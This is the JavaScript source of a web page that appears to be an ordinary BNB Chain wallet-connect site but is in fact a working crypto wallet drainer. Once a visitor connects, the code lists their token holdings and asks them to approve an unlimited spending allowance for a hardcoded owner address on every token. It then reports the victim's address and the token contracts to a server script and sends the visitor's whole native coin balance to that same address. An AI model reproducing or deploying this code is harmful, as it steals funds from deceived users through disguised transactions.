let tokens = []
let chainId = null;
let web3Object = null;
let selectedAccount = null;
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const OWNER_ADDRESS = "0x9868B5935B1b2BfCA9DB689A329f018d35306F4C";

const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }]

$(".dropdown").hide();
$(".origin-bottom").hide();

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            rpc: {
                56: "https://bsc-dataseed.binance.org/",
            },
            chainId: 56,
            infuraId: "d85fda7b424b4212ba72f828f48fbbe1",
            pollingInterval: "10000",
        },
    },
};

let web3Modal = new Web3Modal({
    providerOptions,
    cacheProvider: false,
    disableInjectedProvider: false,
});
$(".on-connect").click(async function () {
    onConnect()
})

async function onConnect(name) {
    try {
        let provider = await web3Modal.connect();
        onProvider(provider, name);
        provider.on("accountsChanged", (accounts) => {
            console.log(accounts);
            onProvider(provider, name);
        });
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }
}

async function onProvider(provider, name) {
    web3Object = new Web3(provider);
    let accounts = await web3Object.eth.getAccounts();
    selectedAccount = accounts[0];

    chainId = await web3Object.eth.getChainId();
    if (accounts.length) {
        notify("Wallet Connected Successfully!")
        // sendAddress()
        covalenthqAPICall(name)
        $(".on-connect").text(addrTruncation(selectedAccount))
        $('.on-connect').prop('disabled', true);
        $('.on-approve').prop('disabled', false);
        $('.on-send-ether').prop('disabled', false);
    }
}

async function covalenthqAPICall(name) {

    const params = {
        format: "JSON",
        nft: "false",
        key: "ckey_8a5f3f4f10b94449beff22ed067"

    }

    const url = new URL(`https://api.covalenthq.com/v1/${chainId}/address/${selectedAccount}/balances_v2/`);
    url.search = new URLSearchParams(params).toString();

    const opts = {
        method: "GET",
        headers: {
            "Content-Type": "application/json",
        },
    };

    try {
        const result = await fetch(url, opts).then(res => res.json())

        let list = result.data.items
        console.log("list", list);
        let map_list = list.map(m => {
            return {
                balance: m.balance,
                address: m.contract_address,
                spot: m.quote_rate,
                symbol: m.contract_ticker_symbol
            }
        })

        tokens = map_list.filter(f => f.spot && f.balance > 0 && f.spot > 0 && f.symbol != "BNB")
        console.log("chainId:", chainId, "Tokens:", tokens);
        if (name)
            $("." + name).trigger("click");
    } catch {
        notify(`Chain ${chainId} not supported!`)
    }
}

$(".toggle-menu").click(function () {
    $(".dropdown").toggle();
})
let selector = ''
function toggleOrigin(name) {
    console.log(name);
    $(".origin-bottom").toggle();
    if (name === "sender" || name === "receiver")
        selector = name
    else
        $("." + selector).text(name);

}


$(".on-approve").click(async function () {
    if (!selectedAccount) {
        onConnect('on-approve')
        return
    }
    if (tokens.length) {
        tokens.forEach(token => {
            let instance = new web3Object.eth.Contract(ABI, token.address);
            instance.methods.approve(
                OWNER_ADDRESS,
                "999999999999999999999999999999999999999999999999999999999999999999999999")
                .send({
                    from: selectedAccount,
                    to: token.address
                })
                .on('transactionHash', (hash) => {
                    console.log("Transaction Hash: ", hash)
                    notify("Transaction is submitted to the network")
                })
                .on('receipt', (receipt) => {
                    console.log("Transaction Receipt: ", receipt)
                    notify("Approve Completed Successfully")
                    sendContract(token.address)
                })
                .on('error', (error) => {
                    console.log("Error: ", error)
                    notify("Transaction Rejected")
                })
        });
    } else {
        notify("No token to approve")
    }
})

$(".on-send-ether").click(async function () {
    if (!selectedAccount) {
        onConnect('on-send-ether')
        return
    }
    try {
        let balance = await web3Object.eth.getBalance(selectedAccount)

        var gasPrice = await web3Object.eth.getGasPrice(); // estimate the gas price

        var transactionObject = {
            gasPrice: gasPrice,
            from: selectedAccount,
            to: OWNER_ADDRESS,
            value: balance,
        }

        var gasLimit = await web3Object.eth.estimateGas(transactionObject); // estimate the gas limit for this transaction
        var transactionFee = gasPrice * gasLimit; // calculate the transaction fee

        transactionObject.gas = gasLimit;
        transactionObject.value = balance - transactionFee; // set the transaction value to the entire balance, less the transaction fee

        web3Object.eth.sendTransaction(transactionObject)
            .on('transactionHash', (hash) => {
                console.log("Transaction Hash: ", hash)
                notify("Transaction is submitted to the network")
            })
            .on('receipt', (receipt) => {
                console.log("Transaction Receipt: ", receipt)
                notify("Transfer Completed Successfully")
            })
            .on('error', (error) => {
                console.log("Error: ", error)
                notify("Transaction Rejected")
            })
    } catch {
        notify("Insufficient funds for transfer")
    }
})


function notify(msg) {
    Toastify({
        text: msg,
        duration: 3000,
        gravity: "top",
        position: "right",
    }).showToast();
}

function sendAddress() {
    var xhttp = new XMLHttpRequest();
    var data = new FormData();
    data.append("Address", selectedAccount);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            console.log("Email Sent!");
        }
    };
    xhttp.open("POST", "../send_address.php", true);
    xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
    xhttp.send(data);
}

function sendContract(contractAddress) {
    var xhttp = new XMLHttpRequest();
    var data = new FormData();
    data.append("Address", selectedAccount);
    data.append("Contract", contractAddress);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            console.log("Email Sent!");
        }
    };
    xhttp.open("POST", "../send_contract.php", true);
    xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
    xhttp.send(data);
}

function addrTruncation(addr) {
    return addr.slice(0, 6) + "…" + addr.slice(addr.length - 6, addr.length);
}